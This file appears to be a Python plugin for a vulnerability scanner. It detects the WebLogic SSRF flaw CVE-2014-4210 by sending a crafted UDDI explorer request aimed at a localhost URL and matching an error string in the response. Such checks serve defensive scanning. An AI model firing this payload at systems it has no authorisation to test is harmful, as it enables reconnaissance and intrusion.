#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://www.cnblogs.com/sevck/p/8092760.html

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'ssrf_cve20144210'
        self.info = "Check the WebLogic SSRF CVE-2014-4210"
        self.keyword = ['all', 'weblogic', 'ssrf', 'web', 'info', 'leakage','cve_2014_4210', '7001']
        self.default_ports_list = [7001,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        poc = "uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"
        urls = []
        urls.append("http://%s:%d/%s"%(ip, port, poc)) if add_web_path == "" else urls.append("http://%s:%d/%s/%s"%(ip, port, add_web_path, poc))
        urls.append("https://%s:%d/%s"%(ip, port, poc)) if add_web_path == "" else urls.append("https://%s:%d/%s/%s"%(ip, port, add_web_path, poc))
        for url in urls:
            try:
                req = Requester(url)
                if 'weblogic.uddi.client.structures.exception.XML_SoapException' in req.html:
                    result = "exists WebLogic SSRF CVE-2014-4210"
                    self._output(ip, port, result)
                    return
            except:
                pass

globals()['VulnChecker'] = VulnChecker